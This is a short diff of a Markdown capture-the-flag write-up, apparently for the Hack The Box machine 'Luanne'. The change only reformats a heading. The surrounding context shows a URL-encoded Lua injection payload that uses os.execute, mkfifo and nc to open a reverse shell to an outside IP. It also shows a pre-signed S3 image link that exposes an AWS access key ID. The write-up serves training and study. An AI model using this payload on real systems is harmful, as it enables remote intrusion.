@@ -94,7 +94,7 @@ priority: 1
 ```ruby
 http://luanne.htb/weather/forecast?city=%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.6%201234%20%3E%2Ftmp%2Ff%22%29--
 ```
-##Getting reverse shell.
+## Getting reverse shell.
 
 ![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b64544ff-c962-4820-89c7-87d16bae551d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T233833Z&X-Amz-Expires=86400&X-Amz-Signature=1c932c8959ac3359021f96e9a027d6478eb9e2d448f981ecb0da2266efb56c24&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)
 
